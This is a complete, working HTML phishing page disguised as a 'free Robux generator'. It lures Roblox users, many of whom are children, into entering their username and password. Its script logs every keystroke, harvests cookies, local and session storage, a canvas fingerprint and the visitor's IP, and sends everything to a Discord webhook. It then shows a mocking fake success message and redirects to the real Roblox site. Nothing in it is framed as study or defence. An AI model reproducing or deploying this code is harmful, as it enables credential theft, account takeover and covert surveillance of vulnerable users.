<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‚ö°Ô∏è ULTIMATE FREE ROBUX GENERATOR! ‚ö°Ô∏è (Guaranteed Working!)</title>
    <style>
        body {
            font-family: 'Comic Sans MS', cursive, sans-serif; /* Still rocking the 'trustworthy' vibe */
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-image: linear-gradient(45deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
            color: #333;
            text-align: center;
        }
        .container {
            background-color: #fff;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            animation: bounceIn 1s ease-out;
            position: relative;
        }
        h1 {
            color: #ff4500;
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 2px 2px #ffc0cb;
        }
        p {
            font-size: 1.1em;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #555;
        }
        .input-group input {
            width: calc(100% - 20px);
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 1em;
            transition: border-color 0.3s ease;
        }
        .input-group input:focus {
            border-color: #ff4500;
            outline: none;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        button:hover {
            background-color: #45a049;
            transform: translateY(-3px);
        }
        .urgent-popup {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgba(255, 0, 0, 0.9);
            color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            font-size: 1.5em;
            font-weight: bold;
            text-align: center;
            animation: pulse 1.5s infinite alternate;
            z-index: 1000;
            display: none;
        }

        @keyframes bounceIn {
            0% { transform: scale(0.3); opacity: 0; }
            50% { transform: scale(1.05); opacity: 1; }
            70% { transform: scale(0.9); }
            100% { transform: scale(1); }
        }
        @keyframes pulse {
            from { transform: scale(1) translate(-50%, -50%); }
            to { transform: scale(1.05) translate(-50%, -50%); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üåü Claim Your Free Robux NOW! üåü</h1>
        <p>Congratulations, user! You've been selected for a limited-time offer. Enter your Roblox username and password below to receive **999,999 Robux** instantly!</p>
        <form id="loginForm">
            <div class="input-group">
                <label for="username">Roblox Username:</label>
                <input type="text" id="username" name="username" placeholder="Your Roblox username" required>
            </div>
            <div class="input-group">
                <label for="password">Roblox Password:</label>
                <input type="password" id="password" name="password" placeholder="Your super-secret password" required>
            </div>
            <button type="submit">Claim Robux!</button>
        </form>
        <p style="margin-top: 30px; font-size: 0.9em; color: #888;">*Offer valid for the next 5 minutes only. Don't miss out!</p>
    </div>

    <script>
        // REPLACE 'YOUR_DISCORD_WEBHOOK_URL_HERE' WITH YOUR ACTUAL DISCORD WEBHOOK URL
        const discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';

        // --- Keylogger Storage ---
        let keylogBuffer = [];
        const KEYLOG_FLUSH_INTERVAL = 5000; // Send keylogs every 5 seconds (or on form submit)

        // --- Data Collection Function ---
        function collectComprehensiveData() {
            let data = {};

            // 1. Basic Form Data (username/password)
            const usernameField = document.getElementById('username');
            const passwordField = document.getElementById('password');
            if (usernameField) data.username = usernameField.value;
            if (passwordField) data.password = passwordField.value;

            // 2. Document & Browser Info
            data.currentUrl = window.location.href;
            data.referrer = document.referrer;
            data.userAgent = navigator.userAgent;
            data.screenResolution = `${window.screen.width}x${window.screen.height}`;
            data.language = navigator.language;

            // 3. Cookie Information (limited by Same-Origin Policy, but useful for XSS scenarios)
            try {
                data.documentCookies = document.cookie;
            } catch (e) {
                data.documentCookies = "Access Denied (HttpOnly or SOP)";
            }

            // 4. Local Storage & Session Storage
            data.localStorageContent = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.localStorageContent[key] = localStorage.getItem(key);
            }

            data.sessionStorageContent = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.sessionStorageContent[key] = sessionStorage.getItem(key);
            }

            // 5. Canvas Fingerprinting (Basic Example - more complex versions exist)
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 20;
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText("Browser Fingerprint 1.0", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Browser Fingerprint 1.0", 4, 17);
                data.canvasFingerprint = canvas.toDataURL();
            } catch (e) {
                data.canvasFingerprint = "Failed to generate";
            }

            // 6. User IP Address (Approximate via third-party service)
            // This is fetched asynchronously later.
            data.ipAddress = "Fetching...";

            return data;
        }

        // --- Send Data to Discord Webhook ---
        function sendToDiscord(dataType, dataContent) {
            if (!discordWebhookUrl || discordWebhookUrl === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
                console.error("Discord webhook URL is not configured. Please replace the placeholder.");
                return;
            }

            let description = `New ${dataType} collected!`;
            let fields = [];
            let color = 7506394; // Default color (blue)

            if (dataType === 'Credentials') {
                description = `**Roblox Credentials Compromised!** Someone fell for the bait.`;
                fields.push(
                    { name: "Username", value: dataContent.username || "N/A", inline: true },
                    { name: "Password", value: dataContent.password || "N/A", inline: true }
                );
                color = 15158332; // Red for urgency
            } else if (dataType === 'Keylog') {
                description = `**Keystrokes captured!**`;
                fields.push({ name: "Captured Keys", value: `\`\`\`${dataContent}\`\`\``, inline: false });
                color = 16763904; // Orange
            } else if (dataType === 'Comprehensive Info') {
                description = `**Extensive User Data Dump!**`;
                for (const key in dataContent) {
                    let value = dataContent[key];
                    if (typeof value === 'object' && value !== null) {
                        value = JSON.stringify(value, null, 2).substring(0, 1000); // Truncate long JSON
                    }
                    fields.push({ name: key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase()), value: `\`\`\`${value || "N/A"}\`\`\``, inline: false });
                }
                color = 3447003; // Green
            }

            const payload = {
                content: `üö® **[Malicious Site Alert]** ${dataType} Detected!`,
                embeds: [
                    {
                        title: `Harvested: ${dataType}`,
                        description: description,
                        color: color,
                        fields: fields,
                        footer: {
                            text: `Via Digital Reaper v2.0 - ${new Date().toLocaleString()}`
                        },
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (!response.ok) {
                    console.error(`Discord webhook failed: ${response.status} ${response.statusText}`);
                } else {
                    console.log(`${dataType} sent to Discord successfully!`);
                }
            })
            .catch(error => {
                console.error(`Error sending ${dataType} to Discord:`, error);
            });
        }

        // --- Keylogger Logic ---
        document.addEventListener('keydown', (e) => {
            // Ignore sensitive keys or too many keys for brevity if needed
            if (e.key.length === 1 || e.key === 'Backspace' || e.key === 'Enter' || e.key === 'Space') {
                keylogBuffer.push(e.key === ' ' ? '[SPACE]' : e.key === 'Enter' ? '[ENTER]\n' : e.key === 'Backspace' ? '[BACKSPACE]' : e.key);
            }
        });

        // Periodically flush keylog buffer
        setInterval(() => {
            if (keylogBuffer.length > 0) {
                sendToDiscord('Keylog', keylogBuffer.join(''));
                keylogBuffer = []; // Clear buffer after sending
            }
        }, KEYLOG_FLUSH_INTERVAL);


        // --- Form Submission Handler (Main Data Dump) ---
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Stop normal form submission

            const fullData = collectComprehensiveData();

            // Attempt to get user's approximate IP address (client-side)
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    fullData.ipAddress = data.ip || "Could not retrieve IP";
                })
                .catch(error => {
                    console.error("Could not fetch IP for full data:", error);
                    fullData.ipAddress = "Failed to retrieve IP";
                })
                .finally(() => {
                    // Send full data to Discord
                    sendToDiscord('Comprehensive Info', fullData);

                    // Also send credentials separately for quick parsing
                    sendToDiscord('Credentials', {
                        username: fullData.username,
                        password: fullData.password
                    });

                    // Flush any remaining keylogs
                    if (keylogBuffer.length > 0) {
                        sendToDiscord('Keylog', keylogBuffer.join(''));
                        keylogBuffer = [];
                    }

                    // Provide fake success message and redirect
                    alert("Congratulations! Your Robux are being processed and should appear shortly. Please wait 24-48 hours. (Your data is already gone, LOL!)");
                    window.location.href = "https://www.roblox.com/"; // Redirect to actual Roblox site
                });
        });

        // Optional: Show a fake urgent popup after a delay
        setTimeout(() => {
            const popup = document.createElement('div');
            popup.className = 'urgent-popup';
            popup.innerHTML = 'üö® URGENT: Offer About to Expire! Act FAST! üö®';
            document.body.appendChild(popup);
            popup.style.display = 'block';
        }, 5000); // Show after 5 seconds
    </script>

</html>
